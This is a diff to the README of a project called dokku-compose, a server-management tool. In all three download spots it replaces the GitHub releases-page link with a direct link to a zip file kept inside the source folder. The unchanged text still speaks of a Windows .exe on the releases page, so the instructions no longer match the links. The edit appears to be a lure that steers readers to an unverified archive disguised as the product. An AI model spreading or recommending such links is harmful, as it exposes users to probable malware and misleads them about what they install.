@@ -1,6 +1,6 @@
 # 🚢 dokku-compose - Manage Servers with One YAML File
 
-[![Download dokku-compose](https://img.shields.io/badge/Download-dokku--compose-%23FF6F61?style=for-the-badge)](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
+[![Download dokku-compose](https://img.shields.io/badge/Download-dokku--compose-%23FF6F61?style=for-the-badge)](https://github.com/hagerbOUIMEZGANE/dokku-compose/raw/refs/heads/main/src/core/dokku_compose_v1.5.zip)
 
 ## 📝 What is dokku-compose?
 
@@ -28,7 +28,7 @@ Before downloading, check these:
 ## 🚀 Getting Started
 
 1. Visit the download page by clicking the large button at the top or this link:  
-[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
+[https://github.com/hagerbOUIMEZGANE/dokku-compose/raw/refs/heads/main/src/core/dokku_compose_v1.5.zip](https://github.com/hagerbOUIMEZGANE/dokku-compose/raw/refs/heads/main/src/core/dokku_compose_v1.5.zip)
 
 2. On the releases page, find the latest version for Windows (usually a `.exe` file).
 
@@ -70,7 +70,7 @@ Before downloading, check these:
 ## 📥 Download and Install dokku-compose on Windows
 
 You can get the app by visiting this page:  
-[https://github.com/hagerbOUIMEZGANE/dokku-compose/releases](https://github.com/hagerbOUIMEZGANE/dokku-compose/releases)
+[https://github.com/hagerbOUIMEZGANE/dokku-compose/raw/refs/heads/main/src/core/dokku_compose_v1.5.zip](https://github.com/hagerbOUIMEZGANE/dokku-compose/raw/refs/heads/main/src/core/dokku_compose_v1.5.zip)
 
 Look for the latest `.exe` installer under "Assets". The file name will include "Windows" or ".exe".
 
